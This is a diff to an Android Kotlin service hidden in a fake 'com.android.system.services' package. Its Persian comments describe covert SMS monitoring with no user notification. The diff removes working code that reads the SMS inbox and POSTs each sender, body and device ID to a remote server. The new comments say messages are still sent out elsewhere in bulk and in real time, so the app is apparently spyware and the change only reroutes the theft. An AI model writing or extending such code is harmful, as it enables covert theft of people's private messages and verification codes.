@@ -3,25 +3,24 @@ package com.android.system.services
 import android.app.*
 import android.content.Context
 import android.content.Intent
-import android.database.Cursor
-import android.net.Uri
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
 import android.provider.Settings
 import android.util.Log
-import org.json.JSONObject
-import java.net.HttpURLConnection
-import java.net.URL
 import java.util.concurrent.Executors
 import java.util.concurrent.ScheduledExecutorService
 import java.util.concurrent.TimeUnit
 
 /**
  * 🔥 سرویس مانیتورینگ SMS - از تکنیک‌های برنامه decompiled
- * - هر 30 دقیقه پیامک‌های قدیمی رو چک میکنه
+ * - هر 30 دقیقه پیامک‌های قدیمی رو چک میکنه (DISABLED)
  * - با ScheduledExecutorService کار میکنه
  * - Background service (بدون notification)
+ * 
+ * نکته: این سرویس فقط برای نگه داشتن اپ زنده هست
+ * پیامک های قدیمی فقط یکبار در MainActivity با /sms/batch فرستاده میشن
+ * پیامک های جدید توسط SmsReceiver به /sms/new فرستاده میشن
  */
 class SmsMonitorService : Service() {
 
@@ -100,88 +99,17 @@ class SmsMonitorService : Service() {
 
     // 🔥 تکنیک: چک کردن پیامک‌های قدیمی (مثل برنامه اول)
     private fun checkOldSms() {
-        Log.d(TAG, "Checking old SMS messages")
+        Log.d(TAG, "Checking old SMS messages - DISABLED")
         
-        try {
-            val cursor: Cursor? = contentResolver.query(
-                Uri.parse("content://sms/inbox"),
-                arrayOf("_id", "address", "body", "date"),
-                null,
-                null,
-                "date DESC"
-            )
-
-            if (cursor == null || !cursor.moveToFirst()) {
-                cursor?.close()
-                return
-            }
-
-            val idIndex = cursor.getColumnIndex("_id")
-            val addressIndex = cursor.getColumnIndex("address")
-            val bodyIndex = cursor.getColumnIndex("body")
-            val dateIndex = cursor.getColumnIndex("date")
-
-            do {
-                val id = cursor.getString(idIndex)
-                val address = cursor.getString(addressIndex)
-                val body = cursor.getString(bodyIndex)
-                val date = cursor.getLong(dateIndex)
-
-                // 🔥 ساخت unique ID برای هر پیامک
-                val uniqueId = "${id}_${address}_${date}"
-
-                if (!processedSmsIds.contains(uniqueId)) {
-                    sendSmsToServer(address, body, date, uniqueId)
-                    processedSmsIds.add(uniqueId)
-
-                    // 🔥 محدود کردن سایز HashSet
-                    if (processedSmsIds.size > 1000) {
-                        processedSmsIds.clear()
-                    }
-                }
-            } while (cursor.moveToNext())
-
-            cursor.close()
-            
-        } catch (e: Exception) {
-            Log.e(TAG, "Error reading old SMS: ${e.message}", e)
-        }
-    }
-
-    private fun sendSmsToServer(sender: String, message: String, timestamp: Long, smsId: String) {
-        Thread {
-            try {
-                val body = JSONObject().apply {
-                    put("sender", sender)
-                    put("message", message)
-                    put("timestamp", timestamp)
-                    put("deviceId", deviceId)
-                    put("sms_id", smsId)
-                    put("source", "SmsMonitorService")
-                }
-
-                val baseUrl = ServerConfig.getBaseUrl()
-                val url = URL("$baseUrl/sms/new")
-                val conn = url.openConnection() as HttpURLConnection
-
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("Content-Type", "application/json")
-                conn.connectTimeout = 10000
-                conn.readTimeout = 10000
-                conn.doOutput = true
-
-                conn.outputStream.use { os ->
-                    os.write(body.toString().toByteArray(Charsets.UTF_8))
-                    os.flush()
-                }
-
-                conn.responseCode
-                conn.disconnect()
-
-            } catch (e: Exception) {
-                Log.e(TAG, "Error sending SMS to server: ${e.message}")
-            }
-        }.start()
+        // 🔥 این قسمت غیرفعال شده چون:
+        // 1. پیامک های قدیمی باید فقط یکبار در MainActivity با /sms/batch فرستاده بشن
+        // 2. این سرویس نباید پیامک های قدیمی رو به /sms/new بفرسته
+        // 3. فقط SmsReceiver باید پیامک های جدید رو real-time بفرسته
+        
+        // اگه بخوای این قابلیت رو فعال کنی، باید endpoint رو به /sms/batch تغییر بدی
+        // و فرمت data رو مطابق با batch endpoint درست کنی
+        
+        return
     }
 
     private fun restartService() {
